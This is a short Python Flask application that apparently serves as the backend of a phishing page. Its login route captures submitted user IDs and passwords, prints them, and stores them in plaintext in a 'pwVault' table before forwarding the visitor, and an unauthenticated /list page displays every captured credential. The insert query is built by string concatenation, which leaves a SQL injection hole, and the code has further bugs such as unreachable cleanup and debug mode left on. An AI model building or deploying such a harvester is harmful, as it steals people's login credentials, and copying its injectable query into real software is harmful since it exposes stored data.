from flask import Flask, render_template, request
import http.server
import socketserver
import sqlite3 as sql
app = Flask(__name__)

Handler = http.server.SimpleHTTPRequestHandler
httpd = http.server.HTTPServer(("", 8081), Handler)

@app.route('/')
def home():
   return render_template('home.html')

@app.route('/login',methods = ['POST'])
def addrec():
    try:
        id = request.form['id']
        pw = request.form['pw']
        test = 'NO'

        print("id: " + id + " pw: " + pw)
        with sql.connect("database.db") as con:
            cur = con.cursor()      
            query = "INSERT INTO pwVault (id ,pw , test) values ('" + id +  "','" + pw + "','" + test + "')"
            cur.execute(query)
            con.commit()
            msg = "Record successfully added"
    except Exception as exp:
        con.rollback()
        msg = "error in insert operation" + str(exp)
      
    finally:
         return render_template("forward.html")
         con.close()

@app.route('/list')
def list():
   con = sql.connect("database.db")
   con.row_factory = sql.Row
   
   cur = con.cursor()
   cur.execute("select * from pwVault")
   
   rows = cur.fetchall();
   return render_template("list.html",rows = rows)

if __name__ == '__main__':
   app.run(debug = True)

httpd.serve_forever()
